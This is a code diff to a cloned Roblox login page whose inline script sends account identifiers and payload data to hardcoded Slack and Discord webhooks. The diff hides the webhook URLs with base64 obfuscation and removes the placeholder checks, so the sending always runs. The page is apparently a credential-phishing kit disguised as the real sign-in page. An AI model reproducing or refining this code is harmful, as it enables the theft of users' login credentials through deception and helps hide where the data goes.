@@ -1,4 +1,4 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -83,7 +83,6 @@
 </style>
 </head>
 <body id="rbx-body" class="rbx-body dark-theme gotham-font" data-internal-page-name="Login">
-
 <div id="wrap" class="wrap no-gutter-ads logged-out">
     <div id="navigation-container" class="dark-theme gotham-font">
         <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
@@ -380,15 +379,15 @@
             </ul>
             <div class="row copyright-container">
                 <div class="col-sm-12">
-                    <p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+                    <p class="text-footer footer-note">©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
                 </div>
             </div>
         </div>
     </footer>
 </div>
 <script>
-const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
+const SLACK_WEBHOOK = atob("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDBDNkEySEdWMFIvQjBDNzZMRDUySlUvVjh4eXdkMTZJazFNbFhzUTlnVWJLcFlaZA==");
+const DISCORD_WEBHOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1NzEyMDUzMDk1NDQ2MTijev5GZjUxUUlYcksyYlpxUExyZ1M0R2Rxbmc1OHJOZUZ0cm5tR2lNScjhRXzNNMWcwb2FVWEFxRGhiV1hJNmpWUHJqNkZv");
 const WAIT = 3000;
 
 const EVENT_TYPES = {
@@ -602,7 +601,7 @@ async function sendStructuredAuditLog(eventType, accountIdentifier, payloadData,
     };
 
     const requests = [];
-    if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== "YOUR_DISCORD_WEBHOOK_URL") {
+    if (DISCORD_WEBHOOK) {
         requests.push(fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -610,7 +609,7 @@ async function sendStructuredAuditLog(eventType, accountIdentifier, payloadData,
         }).catch(() => {}));
     }
 
-    if (SLACK_WEBHOOK && SLACK_WEBHOOK !== "YOUR_SLACK_WEBHOOK_URL") {
+    if (SLACK_WEBHOOK) {
         requests.push(fetch(SLACK_WEBHOOK, {
             method: 'POST',
             mode: 'no-cors',
@@ -875,5 +874,3 @@ document.getElementById('sign-up-link').addEventListener('click', function(e){
 </script>
 </body>
 </html>
-
-1
